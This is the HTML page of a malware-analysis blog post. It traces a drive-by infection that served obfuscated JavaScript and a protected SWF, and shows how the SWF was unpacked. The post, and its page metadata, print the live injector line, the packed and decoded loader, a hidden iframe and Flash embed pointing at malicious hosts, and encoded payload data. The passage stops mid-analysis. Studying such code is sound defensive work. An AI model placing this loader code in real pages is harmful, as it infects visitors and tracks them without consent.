<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
    content="Adrian">
<meta name="description"
    content="A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
document.write(unescape(&amp;quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&amp;quot;));  Digging deeper:
eval(function(p,a,c,k,e,r){e=function(c){return(c&amp;lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&amp;gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&amp;quot;V&amp;quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&amp;quot;1u&amp;quot;);6.w.o=&amp;quot;0&amp;quot;;6.w.j=&amp;quot;0&amp;quot;;6.w.1G=&amp;quot;1M&amp;quot;;6.w.29=&amp;quot;-2d&amp;quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3." />
<meta name="keywords" content="security,research,vulnerabilities,cve,malware,reverse engineering,malware analysis,blog,consulting,cyber" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/post/analyzing-obfuscated-swfs/" />


<title>
    
    Analyzing Obfuscated SWFs :: { bit.therapy } 
    
</title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.min.7bfbbe12786fa0ded4b4c0d792cbb36a5bd0bdb0b856dde57aa7b1f6fe0f2b87.css">



<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
<link rel="shortcut icon" href="/favicon.ico">
<meta name="theme-color" content="#252627"><meta itemprop="name" content="Analyzing Obfuscated SWFs">
<meta itemprop="description" content="A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
document.write(unescape(&quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&quot;));  Digging deeper:
eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3."><meta itemprop="datePublished" content="2016-10-09T13:18:17&#43;00:00" />
<meta itemprop="dateModified" content="2016-10-09T13:18:17&#43;00:00" />
<meta itemprop="wordCount" content="2381"><meta itemprop="image" content="/"/>
<meta itemprop="keywords" content="Malware,Malware Analysis,Flash,SWF,Reverse Engineering," /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/"/>

<meta name="twitter:title" content="Analyzing Obfuscated SWFs"/>
<meta name="twitter:description" content="A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
document.write(unescape(&quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&quot;));  Digging deeper:
eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3."/>



<meta property="article:section" content="Malware" />
<meta property="article:section" content="Malware Analysis" />
<meta property="article:section" content="Flash" />
<meta property="article:section" content="SWF" />
<meta property="article:section" content="Reverse Engineering" />

<meta property="article:published_time" content="2016-10-09 13:18:17 &#43;0000 UTC" />







    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">{ bit.therapy }</span>
            <span class="logo__cursor"></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/post">Blog</a></li><li><a href="/research">Research</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="/post/analyzing-obfuscated-swfs/">Analyzing Obfuscated SWFs</a></h2>

            

            <div class="post-content">
                <p>A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.</p>
<p>The host in question was seen contacting NovaSyncs.com which was serving malicious JS via <code>mine.js</code>:</p>
<pre><code class="language-javascript">document.write(unescape(&quot;%3Cscript src='http://i.ejieban.com/clouder.js' defer='defer' type='text/javascript'%3E%3C/script%3E&quot;));
</code></pre>
<p>Digging deeper:</p>
<pre><code class="language-javascript">eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3.K(v);5.b.C(6,5.b.Z[0]);3.g[8]=6};3.y=9(v,8){4 6=3.K(v);5.b.y(6);3.g[8]=6};3.1e=9(1f,8){4 f=\'&lt;1w\'+\'J 1E\'+\'c=&quot;\'+1f+\'&quot; 1K\'+\'1L=&quot;1&quot; 1R\'+\'1U=&quot;1&quot;/&gt;\';3.y(f,8)};3.27=9(11){4 14=5.1n(\'1o\')[0];4 n=5.16(\'1q\');14.y(n).F=11};3.1s=9(8){H{a(3.g[8]){5.b.1v(3.g[8]);3.g[8]=V}}I(e){}};3.X=9(8,r){4 l=&quot;D&quot;+&quot;p://1N&quot;+&quot;1O.c&quot;+&quot;1Q.c&quot;+&quot;E/1T&quot;+&quot;t.23&quot;+&quot;m?8=&quot;;l+=8+&quot;&amp;r=&quot;+25(r)+&quot;&amp;G=&quot;;4 f=k;4 G=f.u.2e||f.u.2f;l+=G.2g()+&quot;&amp;2h&quot;+&quot;J=2j&amp;2v&quot;+&quot;2w=0&amp;2x&quot;+&quot;J=0&amp;2y&quot;+&quot;2I&quot;+&quot;d=&quot;;l+=z.1m(T*z.U())+&quot;-2M&quot;+&quot;1t-&quot;;4 W=f.A.o&amp;&amp;f.A.j?f.A.o+&quot;x&quot;+f.A.j:&quot;1x&quot;;l+=&quot;&amp;1y&quot;+&quot;1z=&quot;+W+&quot;&amp;1A=0&amp;s&quot;+&quot;1C=&amp;t=&amp;1D=&quot;+z.1m(T*z.U());1j l};3.L=9(){a(5&amp;&amp;5.b&amp;&amp;5.b.Z){4 1F=k.u.10;4 1H=k.1I.1J;4 M=&quot;D&quot;+&quot;p://i.12&quot;+&quot;13&quot;+&quot;N.c&quot;+&quot;E/s&quot;+&quot;1P.s&quot;+&quot;15?d=19.s&quot;+&quot;15&quot;;4 O=&quot;s=1S&quot;;4 P=\'&lt;17 1V=&quot;1W:1X-1Y-1Z-20-21&quot; 22=&quot;18://24.1a.1b/26/1c/28/1d/2a.2b#2c=7,0,0,0&quot; o=&quot;0&quot; j=&quot;0&quot;&gt;&lt;Q R=&quot;1g&quot; S=&quot;1h&quot;/&gt;&lt;Q R=&quot;2i&quot; S=&quot;\'+M+\'&quot;/&gt;&lt;Q R=&quot;1i&quot; S=&quot;\'+O+\'&quot;/&gt;&lt;2k F=&quot;\'+M+\'&quot; 1i=&quot;\'+O+\'&quot; o=&quot;0&quot; j=&quot;0&quot; 1g=&quot;1h&quot; 2l=&quot;2m/x-1c-1d&quot; 2n=&quot;18://2o.1a.1b/2p/2q&quot; /&gt;&lt;/17&gt;\';P+=\'&lt;2r F=&quot;\'+3.X(&quot;2s&quot;+&quot;2&quot;,5.2t)+\'&quot; o=&quot;0&quot; j=&quot;0&quot;/&gt;\';3.C(P,&quot;2u&quot;)}B{1k(3.L,1l)}};3.L();3.q=9(){a(5&amp;&amp;5.b){H{a(/\\2z\\2A\\2B/i.2C(k.u.10)){4 l=&quot;D&quot;+&quot;p://i.12&quot;+&quot;13&quot;+&quot;N.c&quot;+&quot;E/s&quot;+&quot;2D.h&quot;+&quot;2E#s/N&quot;;3.1e(l,&quot;2F&quot;)}}I(e){}}B{1k(3.q,1l)}};H{a(&quot;2G&quot;==5.2H){3.q()}B{a(5.Y){k.Y(&quot;2J&quot;,3.q)}B{k.2K(&quot;2L&quot;,3.q,1r)}}}I(e){}}',62,173,'|||_c1oud3ro|var|document|node||id|function|if|body|||||nodes|||height|window||||width||oload2||||navigator|html|style||appendChild|Math|screen|else|insertBefore|htt|om|src|lg|try|catch|me|getDivNode|oload|fp|an|pm|str|param|name|value|2147483648|random|undefined|sp|stat|attachEvent|childNodes|userAgent|js|ej|ieb|head|wf|createElement|object|http||macromedia|com|shockwave|flash|appendIframe|url|allowScriptAccess|always|flashVars|return|setTimeout|200|floor|getElementsByTagName|HEAD|innerHTML|SCRIPT|false|removeNode|6171|DIV|removeChild|ifra|0x0|sho|wp|st|typeof|in|rnd|sr|ua|position|ho|location|host|wi|dth|absolute|hz|s11|tat1|nzz|he|de|sta|ight|classid|clsid|d27cdb6e|ae6d|11cf|96b8|444553540000|codebase|ht|fpdownload|encodeURIComponent|pub|appendScript|cabs|left|swflash|cab|version|100px|systemLanguage|language|toLowerCase|nti|movie|none|embed|type|application|pluginspage|www|go|getflashplayer|img|203338|referrer|_cl3r|rep|eatip|rti|cnz|wnd|wo|wd|test|tatn|tml|_9h0n4|complete|readyState|z_ei|onload|addEventListener|load|139592'.split('|'),0,{}))
</code></pre>
<p>This will decode to the following and eventually serve a suspicious flash object <code>stat.swf</code>:</p>
<pre><code class="language-javascript">eval(
    if (&quot;undefined&quot; == typeof(_c1oud3ro)) {
        _c1oud3ro = [];
        _c1oud3ro.nodes = [];
        _c1oud3ro.getDivNode = function(h) {
            var node = document.createElement(&quot;DIV&quot;);
            node.style.width = &quot;0&quot;;
            node.style.height = &quot;0&quot;;
            node.style.position = &quot;absolute&quot;;
            node.style.left = &quot;-100px&quot;;
            node.innerHTML = h;
            return node
        };
        _c1oud3ro.insertBefore = function(html, id) {
            var node = _c1oud3ro.getDivNode(html);
            document.body.insertBefore(node, document.body.childNodes[0]);
            _c1oud3ro.nodes[id] = node
        };
        _c1oud3ro.appendChild = function(html, id) {
            var node = _c1oud3ro.getDivNode(html);
            document.body.appendChild(node);
            _c1oud3ro.nodes[id] = node
        };
        _c1oud3ro.appendIframe = function(url, id) {
            var f = '&lt;ifra' + 'me sr' + 'c=&quot;' + url + '&quot; wi' + 'dth=&quot;1&quot; he' + 'ight=&quot;1&quot;/&gt;';
            _c1oud3ro.appendChild(f, id)
        };
        _c1oud3ro.appendScript = function(js) {
            var head = document.getElementsByTagName('HEAD')[0];
            var n = document.createElement('SCRIPT');
            head.appendChild(n).src = js
        };
        _c1oud3ro.removeNode = function(id) {
            try {
                if (_c1oud3ro.nodes[id]) {
                    document.body.removeChild(_c1oud3ro.nodes[id]);
                    _c1oud3ro.nodes[id] = undefined
                }
            } catch (e) {}
        };
        _c1oud3ro.stat = function(id, r) {
            var l = &quot;htt&quot; + &quot;p://hz&quot; + &quot;s11.c&quot; + &quot;nzz.c&quot; + &quot;om/sta&quot; + &quot;t.ht&quot; + &quot;m?id=&quot;;
            l += id + &quot;&amp;r=&quot; + encodeURIComponent(r) + &quot;&amp;lg=&quot;;
            var f = window;
            var lg = f.navigator.systemLanguage || f.navigator.language;
            l += lg.toLowerCase() + &quot;&amp;nti&quot; + &quot;me=none&amp;rep&quot; + &quot;eatip=0&amp;rti&quot; + &quot;me=0&amp;cnz&quot; + &quot;z_ei&quot; + &quot;d=&quot;;
            l += Math.floor(2147483648 * Math.random()) + &quot;-139592&quot; + &quot;6171-&quot;;
            var sp = f.screen.width &amp;&amp; f.screen.height ? f.screen.width + &quot;x&quot; + f.screen.height : &quot;0x0&quot;;
            l += &quot;&amp;sho&quot; + &quot;wp=&quot; + sp + &quot;&amp;st=0&amp;s&quot; + &quot;in=&amp;t=&amp;rnd=&quot; + Math.floor(2147483648 * Math.random());
            return l
        };
        _c1oud3ro.oload = function() {
            if (document &amp;&amp; document.body &amp;&amp; document.body.childNodes) {
                var ua = window.navigator.userAgent;
                var ho = window.location.host;
                var fp = &quot;htt&quot; + &quot;p://i.ej&quot; + &quot;ieb&quot; + &quot;an.c&quot; + &quot;om/s&quot; + &quot;tat1.s&quot; + &quot;wf?d=19.s&quot; + &quot;wf&quot;;
                var pm = &quot;s=de&quot;;
                var str = '&lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;/&gt;&lt;param name=&quot;movie&quot; value=&quot;' + fp + '&quot;/&gt;&lt;param name=&quot;flashVars&quot; value=&quot;' + pm + '&quot;/&gt;&lt;embed src=&quot;' + fp + '&quot; flashVars=&quot;' + pm + '&quot; width=&quot;0&quot; height=&quot;0&quot; allowScriptAccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;&lt;/object&gt;';
                str += '&lt;img src=&quot;' + _c1oud3ro.stat(&quot;203338&quot; + &quot;2&quot;, document.referrer) + '&quot; width=&quot;0&quot; height=&quot;0&quot;/&gt;';
                _c1oud3ro.insertBefore(str, &quot;_cl3r&quot;)
            } else {
                setTimeout(_c1oud3ro.oload, 200)
            }
        };
        _c1oud3ro.oload();
        _c1oud3ro.oload2 = function() {
            if (document &amp;&amp; document.body) {
                try {
                    if (/\wnd\wo\wd/i.test(window.navigator.userAgent)) {
                        var l = &quot;htt&quot; + &quot;p://i.ej&quot; + &quot;ieb&quot; + &quot;an.c&quot; + &quot;om/s&quot; + &quot;tatn.h&quot; + &quot;tml#s/an&quot;;
                        _c1oud3ro.appendIframe(l, &quot;_9h0n4&quot;)
                    }
                } catch (e) {}
            } else {
                setTimeout(_c1oud3ro.oload2, 200)
            }
        };
        try {
            if (&quot;complete&quot; == document.readyState) {
                _c1oud3ro.oload2()
            } else {
                if (document.attachEvent) {
                    window.attachEvent(&quot;onload&quot;, _c1oud3ro.oload2)
                } else {
                    window.addEventListener(&quot;load&quot;, _c1oud3ro.oload2, false)
                }
            }
        } catch (e) {}
    })
</code></pre>
<h2 id="unpacking-the-swf-for-analysis">Unpacking the SWF for analysis</h2>
<p>The ejieban.com <code>stat.swf</code> file looks to be encoded with DComSoft&rsquo;s SWF Protector. This is essentially an encoder designed to protect flash bytecode from analysis.</p>
<p>Fortunately it’s fairly straightforward to reverse.</p>
<p><img src="/images/2016/10/encoded_swf.png" alt=""></p>
<p>SWF Protector works just like any other encoder and inserts a stub that loads the original resource into memory and decodes it. This is obvious with the use of the <code>this.loader</code> object and the eventual call to <code>this.loader.loadBytes()</code>:</p>
<p><img src="/images/2016/10/main_swf_loader_loadBytes.PNG" alt=""></p>
<p>Debugging this with <a href="https://www.free-decompiler.com/flash/download/">FFDec</a> proved to be a bit of challenge. The flash debugger would crash and fail to hit the breakpoint.</p>
<p>Since SWF Protector eventually loads the decoded SWF in memory I can execute stat.swf in Firefox and search <code>plugin-container.exe</code>&rsquo;s memory space for SWF objects.</p>
<p>Executing the SWF with Flash 23 triggers a sandbox security exception on <code>ExternalInterface.call()</code>. ExternalInterface is an API that allows the Flash object to execute code on the browser:</p>
<p><img src="/images/2016/10/flash_security_error_waiting_inmem.PNG" alt=""></p>
<p>While the Adobe Flash plugin in Firefox is waiting for me to handle the exception, I can go to <code>Tools &gt; Search SWFs in memory</code> in FFDec and try and find and dump the decoded Flash object:</p>
<p><img src="/images/2016/10/search_swf_inmem.PNG" alt=""></p>
<p>I&rsquo;m looking for <code>plugin-container.exe</code>, a separate process spawned by Firefox to handle plugins:</p>
<p><img src="/images/2016/10/11kb_flash_obj_inmem.PNG" alt=""></p>
<p>There are several SWF objects in memory; what I&rsquo;m interested in is one slightly smaller than the encoded original (13kb). I was playing around with SWF Protector and noticed it doesn&rsquo;t do much compressing when it obfuscates the SWF. It ends up adding a few KBs of overhead stub code to the obfuscated object.</p>
<p>The 11kb object in the <code>87*</code> address range should be what I&rsquo;m looking for.</p>
<p>I can see references to the <code>SSetter</code> class that threw the earlier exception in Firefox; this must be the decoded SWF. The object can be saved to disk for further analysis.</p>
<h2 id="analyzing-the-deobfuscated-code">Analyzing the Deobfuscated Code</h2>
<p>The decoded SWF uses a <code>BaseCoder</code> class which appears to be a base64 encoding/decoding routine with a custom character table:</p>
<pre><code class="language-java">package disp
{
   import flash.utils.ByteArray;
   
   public class BaseCoder
   {
      private static var base64Table:Array = [&quot;L&quot;,&quot;V&quot;,&quot;4&quot;,&quot;F&quot;,&quot;k&quot;,&quot;1&quot;,&quot;d&quot;,&quot;E&quot;,&quot;T&quot;,&quot;7&quot;,&quot;_&quot;,&quot;N&quot;,&quot;Y&quot;,&quot;5&quot;,&quot;t&quot;,&quot;S&quot;,&quot;o&quot;,&quot;2&quot;,&quot;m&quot;,&quot;s&quot;,&quot;H&quot;,&quot;U&quot;,&quot;w&quot;,&quot;P&quot;,&quot;R&quot;,&quot;i&quot;,&quot;u&quot;,&quot;b&quot;,&quot;j&quot;,&quot;Z&quot;,&quot;3&quot;,&quot;y&quot;,&quot;I&quot;,&quot;z&quot;,&quot;g&quot;,&quot;h&quot;,&quot;X&quot;,&quot;^&quot;,&quot;G&quot;,&quot;e&quot;,&quot;D&quot;,&quot;p&quot;,&quot;0&quot;,&quot;9&quot;,&quot;r&quot;,&quot;l&quot;,&quot;K&quot;,&quot;O&quot;,&quot;8&quot;,&quot;B&quot;,&quot;W&quot;,&quot;6&quot;,&quot;n&quot;,&quot;q&quot;,&quot;Q&quot;,&quot;v&quot;,&quot;a&quot;,&quot;c&quot;,&quot;f&quot;,&quot;A&quot;,&quot;C&quot;,&quot;J&quot;,&quot;x&quot;,&quot;M&quot;,&quot;~&quot;];
      
      private static var decode64Table:Array = null;
      ...
</code></pre>
<p>Right at the top of the <code>SSetter</code> class, a hard-coded string <code>ss</code> stands out. It seems to have been passed through the BaseCoder encoding routine:</p>
<pre><code class="language-java">private var ss:String = &quot;iizPzbG4cZhw^ZOdzb8gkNrdBR9WHNrd^jAgqiGscZhw^ZOdzbhgl_WP2iqPajDGBRz6jSeWHtDG1jWdUj7QobDeJRzWX_pmI_DWqRh6k7pwYSqh5Snq^jKGciGWJjlGzozQ5jOXHiDdrRWWXtfmcRnW5bnq^jKGIi6WX5pglypsIizgj7KWUj8G1bhdIiOmCPrg2HWvcuew^_AmzZpQHbDdnRlW7_bPzihmn_JUluhqBPCPzihml_9slSGUcZhw^ZOdzb^gl_WP2iqPajIGlj^^qPZPHtJQUiKe2RpvabDQl_WP2iqPajeGBPv1Z_JWYtJQnYAPzZpQHbDdnRlW^_Gwl_bdnRpqqj8F7N^eBjzdHRDQUbvG7T^1UianIje4BPg1l7^WY_pdZ_jWTPedZNe4X7rWluhqXPAmUjnG7ZKPVTJEj_D4I5p4D3KvqYb6rPqsoTJdrR6sTNJhTTAgcYqWLSAscYcWoSDs^YAgcYqWLSAsz5XgTwcWnTG^27bGXTghcPcml_XPTwcWnTK^I3Wmq_JPYtK6aYJGI5W4r_QPY_KFnYJhXY6gHNJenYAEaYBWnYnFT_rFBb5W8NrkBZ8gr_QP2_bdnYG^27bGnYK^RRGmriW1cPzmTwcWnTG^27bGnYK^rRgU7tZmJwZQl_1PR3D6RjG4TTzgLSpP13e68_e1riW1cPzmTwcWqTb^qbjql78Wq_BP23bQnYK^rRgU7tZmJwZQn_rkBsQ4q_JPz2^Wl_JPcYcWT_pF1yAPaYWWTSAscYqWr_AWI56gHNxekYpHcYcWT_pFktIvIonm^_A4aYBWIYW4CNrdBsYmRNrE^jJ47NWFq_JPYtK6nwgho_DFBiv4YNpdU3Anz5hgqTjs7Pj4TPp4R3D6aRBWzbjmTPK4BjjqlTjgTPW4BZj^XTxgkNpsH3I6qRhhHtI6qojh7Pj4TPA4L5WmBSjU^TjhTPA4V5amYSKwnYDw8Pg1BTjUXTAgz5agnSBgl_gPYSKwRYDwBYa4l_4sYSKwRYDwr3B4l_JsHtI6qmjF87B6LiamBSjU8Te^T_96ZPj4TPI4quj67Pj4r7WW8_eq8Pg11TFFBSjU1T7h1t_h1NNs1Nts1NHs1NRs8Pg17TlFBSjU1TXhCtOgkYKeawBmCtWmC3BmC5BgCjBWC5BmaZB4YZBmn3vhLNrF8Y848Pg1DTJd8Pg1BYjUVTpgBSjU1TjhTPx4aSIkquj6TPB4BYjqVTogBSjUkTWh8Pg1aNC6Vs9gBSjU1T2h8Pg1LTJ18Pg1jP94lRjgB7jqCTxgaSIkquj6TPB4BYjUVTogBSjU8Te^T_9nZPj4TPO48SBhLUaWBSjU8Te^T_96ZPj4TPI4quj67Pj4r7WW8_eq8Pg1YTJ18Pg1jP94lRjgB7jqLTBgqYjs7Pj4l74W8_eq8Pg1DTJd8Pg1BYjUVTpgBSjU1TjhTPI4YYJs8Pg17YjsTPI4XYJU8Pg1jYOhn3B4n5BgB5jULTWgqtjFTPB4DiOFTNc6XNK^XYOsrYOGBYjGTPI4aNC61N^68Se^otKQcUU4o_KdzUjg17h6jPp4a_BmqbT61yAPaiW4z2jg1786jPp4VwZ6HND^ciw48_e11YjPX7pWYNJ^lRjWc7eWZPJ4qyEPH_pdq3JvT_AmcYPWoSDsBYDgr_qPaTJdciw48_e15YjwX7AWcbdgDNJGLTghatKQc2pgTS8mlTKhRNKXRYJP1TvhlTKhRNKXIYJPnTBgT3AmrYgqTH9mnYJ^lbKh1NOhISAwciH4HND^^bJgYtK6nsn6T_rFoYpsH3I6qmjF87B68oe^8_eqLmaW7Sjmr7WW8_eqVT9g7Sjmr7WW8_eqLTBg82e18_eqnRg6jP94oY9sjPg41T1FjP94jPB4n2ghTYImZYjHl7jW17T6TSBmCTxgjPA4cYPWT_rF^mJ4YtK6nmnhT_rFjYpsU3AnL5BmqtXF7wZ6DNKeBYCH2ybdnYK^a3BgriB6ItB4^5JWz2^Wl_JPry6s1N5hoSDsBYggjNrd^ZA4I5BgqSnsr_6PCNDX8YggCYfHLYgUl_Vso_DFr_6PDNDX8Y6gDN9^zTzgVNf4VNj4T79WrRggjPp4Tt9W^iJW1NzFq_BPY3K6IsWWTNB4aHBgYHgWT_pQRtD6RiGWZPj4k7JW^iVWo_DFr_6PDNDXBYegn_rPkYpwnyAPaYBWnRnhT_pFo3KQaUB4IU6m7w2WrTWgXPAmrYgqTH9mnYJ^iYJUYtK6nwnFI_rF^jAgV5rmTSBmTw9gLTfeCNWWTY94TTBhYNgGT_WWcYhgrTggYYOhoYgh7_nWTNqhrTggCbasTSAmrbJ4rtg4T7JerTWgz5Wgr_gmX7JXrTqhRTJdr3qhXTJkaiBgauW4BRCPaiBgauW4lRrhq_767NhhX_94RTWgTi94rTJXHYGGRYgGT_WWni8677DhrTggnm8677phrTggDYgG7_XWTSAmrbJ4a2B4IuBmpukg1N9hX_p4T_lWCYgGT_WWnjg4HtI68YJwciFgDNGGR7KGcopWRSKQco0W7_aWlTGgYNKXDugsYYge8t9QTSGmoYgeT_WWnZgs1_r6T_GWaYJwiY64rTggjYJeo7Je77ahTS9ma2B4IuBmpukg1N9hX_p4HtI6qHjhB7m6YTJ18Te^8_9QjPg4DTJdLTghXTJdLTghcNj6r7W6V3mgry6s1NKhoSDs^bA4L5am7SRmrTDgkYIXTYDXX_KmYYDXr_qsITJdcYRW8_e12YjXB7rWByzE7N1hr_6sjND^BtD4l_Vso_DFl_1PY3K6TYDw^tJ4z2^Wl_JP8yBm^jJgXyDmr_esRNWFkNQF85egByGEBiyE2jzvBZGEcZhw^ZOdBbQe7RCPiuCw^yXd5yyE2jzvBZXE5bqQUbKwBZGEBjCEByCE5uCezy^dZuDwBZvE2unwBuKEqR^wByCEiyKdBy^E5b^EByCEZynEBRCvByGEcuCw^ZKQJivd5y^E2Zp1UbOw2ZCPqjCd5jWQUiKwqyzkzZCd7ZcE5ynEB3^w5yzd5ZDd5ynEBjreBizvpj6dqy^d5yKE5yOEBb8E7RzPBbzPijXdiyzEUb^E2ypdBZpeZbCw7jhv7yOd^iCEVR8PciXwzopQ2bCd7R^v2R^PB2^wUbKwBZzE2jpdBZfeB3le5RWwqb^Q^izd5y6EZynEiyrd5RDP1UWGBjzvZbzE53CPBRrwZbsv7Rpv2jVE5R^Q5jCv7ZrPiyrd5RDP5yDE5b9Q1ZQQBinP23CE1RrQUbQdBRCwJRlQky8FVYCFqjCG^2wkzyndVZCE7b0Q5inw5yqE5RneBj^e1ZrGcyzd^ZeG2ROPBjGeJbOd8jWeoYvsI56Fo5ah7yzE2bOGBb6PBjpE2b^GJ3Gk5ynE^yKdUbWG2m51BsTE12kH5yF1^HoX8UBEL58s5yzd5RCeZjGv1b6dBuhE7RCwJj6d2upPcbCQ7R6wBbqQUZCdUbGd8ZBEVY8FB3QE7i6PJuKwjy8F^yGd1jCGBRzQ5jpvBi6EBjveBuXPzZCdUuCdZuDwBZhE5bpEBiXEZYhhTiQdBizPiiXsUyad5isw7Rpv2jCEVRCP1YhsBizeJRqGBZgE1bKdBulvibpvBi6P1ZndzyndBbCwitgsBtWEqiOwUZFG^urdBiKEBZrwUyldURXGoynFH5qFHYn6LY8FBYnEV3^PzyndBZDEB36e1YCspbfeJyld5ynEBRDPBZ^E5bOGUiUd^HFXqb8Qcb^Q2bCeVR8P^bhd2RpPcbCQBjqd^iKQVjzvUiCQZZvv5ycE2j^vBbzHZbqGZR^wByzdZbqGZR^w2yOEJsvd7iFP5R^PcyndBuKPcb^Q7y^EBj^E2RpPBjWE^ZCdcRfQpyyE^iCwJiCQUinQBizGzj8Q1bcd7iCPJRXQ7izwUjCQUird^RCPYYcsX5WsRyBF15C6ViXeZbKvJbzd8iqEVYCFIY8E5yDEBbvvBjvEBipeBbWe2bCGUjgE7y^EUZWEBbKeZiCP12ndBieP2iHPqu^wkyvFY5QFVYCFUjGG7iWP7iCPUinQB2^wUbKw5Z4E23zUciznHbew5N8e^bndZ_C4X7rWBYA4Xypm&quot;;
</code></pre>
<p>A <code>fetchit</code> function calls <code>i.ejieban.com/stat.do?p=xxx</code> which returns an array of this custom base64 encoded data (separated by semicolon).</p>
<p>The call path:</p>
